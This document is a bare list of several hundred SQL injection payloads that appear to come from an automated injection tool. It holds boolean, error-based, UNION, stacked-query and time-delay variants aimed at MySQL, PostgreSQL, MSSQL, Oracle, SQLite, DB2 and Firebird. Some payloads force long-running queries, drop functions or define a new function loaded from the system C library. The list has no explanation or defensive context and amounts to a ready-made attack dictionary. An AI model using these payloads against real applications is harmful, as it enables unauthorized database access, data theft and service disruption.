+1') as fyuh where 7608=7608 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+-5945'))) union all select 4266,4266,4266,4266,4266--
+1'||(select 'ybfo' from dual where 3319=3319 union all select null,null,null,null,null,null,null,null#
+1') as uwmy where 6980=6980;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1')) as pgif where 6346=6346;if(7899=7899) select 7899 else drop function zbbp--
+-9739' or 8571=8571--
+1') where 5378=5378;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--
+1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw
+1 where 2239=2239 and 6969=(select 6969 from pg_sleep(5))--
+-4558' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1%'))) union all select null,null,null,null,null,null,null,null#
+1'+(select ahyw where 6893=6893 waitfor delay '0:0:5'--
+1')) waitfor delay '0:0:5'--
+-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#
+1" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--
+1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'ukzb'='ukzb
+1") as xwnu where 6490=6490 union all select null,null,null,null,null,null--
+-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#
+1%")));select pg_sleep(5) and ((("%"="
+1')));select pg_sleep(5)--
+1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--
+1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk
+1") where 7228=7228;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1") where 1607=1607;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+-7941%') union all select 6965,6965,6965,6965--
+1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)-- mwsm
+1") where 9086=9086 or sleep(5)#
+-4304' where 1005=1005 union all select 1005,1005#
+1%' union all select null,null--
+1'||(select 'zdfo' from dual where 4288=4288 union all select null,null,null,null,null,null,null--
+1%") union all select null,null,null,null,null,null,null,null--
+-5385" union all select 4577,4577,4577,4577,4577,4577,4577#
+1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748
+1'+(select 'ezpy' where 5282=5282 order by 1#
+1")) as zbfj where 2285=2285;(select * from (select(sleep(5)))acdk)#
+-9699")) or (8459=8459)*4906 and (("dufs"="dufs
+-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--
+1";select sleep(5)
+1%') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('khah' like 'khah
+1');select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
+1"))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((("urqg"="urqg
+1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('hllf'='hllf
+1" and elt(4594=1040,1040)
+-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='
+1')) as hfra where 6500=6500 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (("bfko"="bfko
+1'+(select zwsr where 6567=6567;select pg_sleep(5))+'
+1") as xylo where 2112=2112 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1%' union all select null,null,null,null#
+1");begin user_lock.sleep(5); end and ("nuix" like "nuix
+-3954')) union all select 2417,2417--
+1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('rpof' like 'rpof
+1%"))) union all select null#
+-9440" union all select 5599,5599,5599,5599,5599--
+-8609' union all select 9384,9384,9384,9384--
+-2373%") or 9323=9323#
+1'||(select 'cqjw' from dual where 7335=7335 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'
+-6129 union all select 9122,9122#
+1 union all select null,null,null,null,null,null,null,null#
+1%'))) and (3020=3020)*6703 and ((('%'='
+-6453")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#
+1%')) and 2388=benchmark(5000000,md5(0x6d457153))#
+-6815) where 2498=2498 union all select 2498,2498,2498,2498,2498--
+1" or 8466=benchmark(5000000,md5(0x694a4745))
+1")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (("oxvw"="oxvw
+1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003
+1%'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%"))) and 6969=(select 6969 from pg_sleep(5)) and ((("%"="
+-8722%' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='
+1" where 1132=1132 or 6793=(select 6793 from pg_sleep(5))--
+1"));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#
+-9014%') union all select 4211,4211,4211,4211,4211,4211#
+1'||(select 'xdzp' from dual where 5786=5786 and (3020=3020)*6703)||'
+1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (3814=3814
+-6200')) as jjpz where 4490=4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--
+1 where 4468=4468 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1" rlike (select (case when (2724=4757) then 1 else 0x28 end)) and "cmsa"="cmsa
+1%"))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((("%"="
+1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476
+1',(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))
+1");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ("eboa" like "eboa
+1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1'))) and sleep(5) and ((('lbmp'='lbmp
+1"));select count(*) from generate_series(1,5000000) and (("dros"="dros
+1%"))) union all select null,null,null,null,null,null--
+1)) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('dqjq'='dqjq
+-2715')) union all select 8646,8646,8646,8646,8646,8646,8646,8646--
+-5032' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1") where 9295=9295 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1' where 4358=4358 union all select null,null,null,null--
+1";select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1)) rlike (select (case when (6113=1222) then 1 else 0x28 end)) and ((2815=2815
+1')));select (case when (1291=6612) then 1 else 1291*(select 1291 from master..sysdatabases) end)--
+1") where 7950=7950 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'lvyw'='lvyw
+1'+(select 'hrxp' where 5948=5948;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)+'
+-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114
+1%"));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
+1'||(select 'epjf' from dual where 8584=8584 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902
+1") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ("thkh" like "thkh
+-7505')) as lqvw where 8565=8565 or 6872=6872--
+1 where 7158=7158 or elt(5873=5873,sleep(5))#
+1"));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--
+-6095") as hygc where 8142=8142 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and "aixs"="aixs
+-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='
+1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# cykf
+1")) and (3020=3020)*6703 and (("bely"="bely
+1") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ("liar"="liar
+1'+(select 'kiqf' where 5920=5920;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1') where 9454=9454 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1"))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((("text" like "text
+1"))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (("ffcf" like "ffcf
+1) as attr where 8085=8085 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ("pdqm" like "pdqm
+1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1") and elt(1889=7397,7397) and ("kuau"="kuau
+-6680') or 5483=3031 and ('zxes'='zxes
+1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw
+1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm
+1') rlike (select (case when (9308=2540) then 1 else 0x28 end)) and ('rghd'='rghd
+1'));select pg_sleep(5) and (('vxxg'='vxxg
+1'||(select 'yaii' from dual where 7317=7317 union all select null,null,null,null,null,null,null,null,null#
+1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+1%') and 4061=2730#
+-8410'))) or 8571=8571--
+1')) and elt(4249=4249,7259) and (('oucg'='oucg
+-6305"))) or 8097=2048 and ((("euyy" like "euyy
+-5187") union all select 3373,3373#
+1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'
+1%";waitfor delay '0:0:5'--
+-7858') union all select 1541,1541,1541,1541,1541,1541#
+1' where 4150=4150 and elt(8012=6026,6026)--
+1"))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((("staz" like "staz
+1") where 7452=7452;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1%"))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((("%"="
+1)) as gygm where 4024=4024;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#
+1")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1%');if(8284=6171) select 8284 else drop function mbih--
+1%')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('%'='
+1');begin user_lock.sleep(5); end--
+1 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# odvp
+1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('quqx'='quqx
+1" and 4996=4431 and "jzaq"="jzaq
+1' and 9198=9198--
+-4635" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#
+-5062) where 7457=7457 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+1'||(select 'cjwx' from dual where 7637=7637 and elt(9548=3991,3991))||'
+1")) or (select * from (select(sleep(5)))ydpu) and (("imlq" like "imlq
+1%'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('%'='
+1%')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('%'='
+1")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (("vlev" like "vlev
+-3719" union all select 6609,6609,6609,6609#
+1%"))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((("%"="
+1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (3326=3326
+-3758')) union all select 9460,9460,9460,9460,9460,9460,9460,9460--
+1" where 6111=6111 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+-8698" where 1990=1990 or (8459=8459)*4906--
+1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#
+-8046"))) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#
+1'+(select 'rpbx' where 6748=6748 and elt(4249=4249,7259))+'
+1"))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1" where 1452=1452 union all select null,null,null,null--
+1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='
+1')) and (3020=3020)*6703 and (('pfal'='pfal
+1') rlike (select * from (select(sleep(5)))sgvo) and ('zqiw'='zqiw
+-3261"))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((("yxms"="yxms
+1')) as owcw where 1107=1107 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+-5245' or elt(1032=1032,3623) and 'qfvo'='qfvo
+1%')) and 6969=(select 6969 from pg_sleep(5)) and (('%'='
+-4100')) union all select 1163,1163,1163--
+1'||(select 'homm' where 4937=4937 rlike (select * from (select(sleep(5)))vwyq)#
+1') union all select null,null,null,null,null,null,null,null,null--
+1'+(select 'gmpn' where 8137=8137 or sleep(5))+'
+1%') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='
+1" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)
+-9432)) as nqya where 8387=8387 or elt(9242=6180,6180)--
+1) or 6793=(select 6793 from pg_sleep(5))
+1 and sleep(5)-- ruuv
+1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eimq'='eimq
+-9688%'))) or elt(3695=7995,7995) and ((('%'='
+1 where 4477=4477 union all select null,null,null,null,null,null,null,null,null,null--
+1)) as rroe where 4840=4840;select * from generate_series(3607,3607,case when (3607=4242) then 1 else 0 end) limit 1--
+-5294%") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ("%"="
+1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)
+1%'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='
+1)) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((3038=3038
+1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+-5058%' union all select 6789,6789,6789,6789,6789#
+-5026' where 7324=7324 union all select 7324,7324--
+1'||(select 'scwx' where 6591=6591 and 3824=benchmark(5000000,md5(0x76555642)))||'
+1" rlike (select * from (select(sleep(5)))sgvo) and "cxsu" like "cxsu
+1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf
+1") as dgzf where 4834=4834;select (case when (2161=4328) then 2161 else 2161*(select 2161 from mysql.db) end)#
+1';begin dbms_lock.sleep(5); end
+1);iif(5462=8866,1,1/0)
+1") as duvm where 6190=6190 order by 1--
+1 where 8393=8393;select (case when (9299=2760) then 1 else 9299*(select 9299 from master..sysdatabases) end)--
+-1755%' union all select 2615,2615,2615,2615,2615,2615#
+1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd
+-3819'))) union all select 9014,9014,9014,9014,9014,9014--
+1') as viex where 6242=6242 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--
+1"))) or 8156=(select count(*) from generate_series(1,5000000))--
+1%';select count(*) from generate_series(1,5000000)--
+1 where 8921=8921 rlike (select * from (select(sleep(5)))sgvo)--
+1"))) rlike sleep(5) and ((("qcqx" like "qcqx
+1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))# mpyu
+1" where 3484=3484 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'||(select 'baur' from dual where 9384=9384 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1%'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('%'='
+1') and elt(1407=6365,6365) and ('zckl'='zckl
+1'))) union all select null,null,null,null,null,null,null--
+1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'nbxw'='nbxw
+1") where 9285=9285 and 8506=8343#
+1') and (select * from (select(sleep(5)))fzno)
+1%"));if(7899=7899) select 7899 else drop function zbbp--
+(select (case when (9066=5598) then 1 else 9066*(select 9066 from information_schema.character_sets) end))
+-1763%" or (8459=8459)*4906 and "%"="
+1')));select sleep(5)#
+1" where 8697=8697 and elt(3114=3114,sleep(5))#
+1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)
+1') and (1414=4775)*4775 and ('mlmw'='mlmw
+-1513") as swvd where 2958=2958 union all select 2958,2958,2958--
+-9771' or 5113=5365
+1%") and 4595=4595#
+1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz
+1%')));select count(*) from generate_series(1,5000000) and ((('%'='
+1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+1" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and "pnub"="pnub
+1")) as tpeh where 6306=6306 and 5965=5806#
+1" union all select null,null,null,null,null,null,null,null--
+-2241))) or make_set(9354=9354,7185) and (((6840=6840
+1"))) or elt(5873=5873,sleep(5))#
+1;waitfor delay '0:0:5'-- thuo
+1%")));begin user_lock.sleep(5); end and ((("%"="
+1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('zurf'='zurf
+1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nbsr' like 'nbsr
+1" where 4082=4082 and elt(5699=1432,1432)--
+1%"));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (("%"="
+-3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#
+-3370' in boolean mode) union all select 3432,3432,3432,3432#
+1'||(select 'xwbo' from dual where 1263=1263 waitfor delay '0:0:5')||'
+1" where 5062=5062;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+-7786')) or 9323=9323#
+-3960' or 9323=9323#
+-2951 or 4189=2291
+1') as jlae where 1650=1650;begin user_lock.sleep(5); end--
+-1055' union all select 7758,7758,7758,7758,7758,7758--
+1") or 8421=(select count(*) from generate_series(1,5000000)) and ("ctrr"="ctrr
+1%" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and "%"="
+-2120') or 8734=8844#
+1") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--
+-8069)) as sxbn where 7689=7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--
+1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ctdx
+1%" union all select null,null,null,null#
+-4327" or make_set(3107=1781,1781) and "lclf" like "lclf
+1') where 7903=7903;select (case when (8841=9675) then 8841 else cast(1 as int)/(select 0 from dual) end) from dual--
+1") and make_set(4553=8132,8132) and ("pfci" like "pfci
+1')) as oldh where 9551=9551 union all select null,null,null#
+1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('wsmq'='wsmq
+1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('cdaq' like 'cdaq
+1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((4537=4537
+1' or sleep(5) and 'udqz'='udqz
+1'+(select xruo where 5709=5709 and 7533=7533)+'
+1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo
+1%"))) and 8407=(select count(*) from generate_series(1,5000000)) and ((("%"="
+1) where 9307=9307;select pg_sleep(5)--
+1' in boolean mode);if(3392=4422) select 3392 else drop function xsqq--
+1'+(select 'hhnz' where 2465=2465;select (case when (3537=5218) then 3537 else 3537*(select 3537 from mysql.db) end)#
+-8233' or 9538=1882#
+1") where 9248=9248;if(6767=5022) select 6767 else drop function buii--
+1'+(select nsri where 1202=1202 and 4595=4595#
+1'||(select 'uyfo' where 1236=1236 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'
+-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw
+1")) or 6793=(select 6793 from pg_sleep(5)) and (("ejpw"="ejpw
+1',(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))
+1%') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='
+1')));select * from generate_series(9709,9709,case when (9709=7795) then 1 else 0 end) limit 1--
+1') where 3255=3255 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+-9133")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (("crfy"="crfy
+-1106')) union all select 2855,2855,2855,2855,2855,2855,2855#
+-8463))) or 4861=9834#
+1')) as uuuk where 7234=7234 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--
+-7663')) or 1558=1104 and (('wsrq'='wsrq
+1" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1'||(select 'rqzu' from dual where 9516=9516 or elt(5873=5873,sleep(5))#
+-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--
+1%"))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-4596" union all select 5761#
+1'||(select 'ovlx' where 8767=8767 or sleep(5))||'
+-2717" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1%'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1%" and (3020=3020)*6703 and "%"="
+-9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3424')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('dyuo'='dyuo
+1')) as plgq where 1121=1121;select pg_sleep(5)--
+1) where 7775=7775 union all select null,null,null,null--
+1"))) rlike (select * from (select(sleep(5)))sgvo) and ((("tpxo" like "tpxo
+1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('uwbh'='uwbh
+1")) as qhnb where 8302=8302 and (3020=3020)*6703--
+1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1") as kdvb where 2651=2651 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--
+1" where 9341=9341;select (case when (7645=5921) then 7645 else 7645*(select 7645 from information_schema.character_sets) end)#
+1) where 9552=9552 and 1961=6333--
